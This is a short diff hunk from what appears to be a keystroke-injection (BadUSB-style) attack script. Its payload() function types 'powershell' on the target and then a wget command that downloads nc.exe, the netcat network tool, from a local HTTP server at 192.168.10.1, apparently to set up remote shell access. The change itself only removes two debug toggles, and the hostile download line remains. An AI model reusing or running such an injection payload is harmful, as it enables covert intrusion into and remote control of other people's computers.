@@ -47,9 +47,7 @@ def payload():
 	eco.type("powershell")
 	eco.press("ENTER")
 	sleep(1)
-	eco.debug=True
 	eco.type("wget http://192.168.10.1:8000/nc.exe -OutFile nc.exe")
-	eco.debug=False
 	eco.press("ENTER")
 	sleep(5)
 
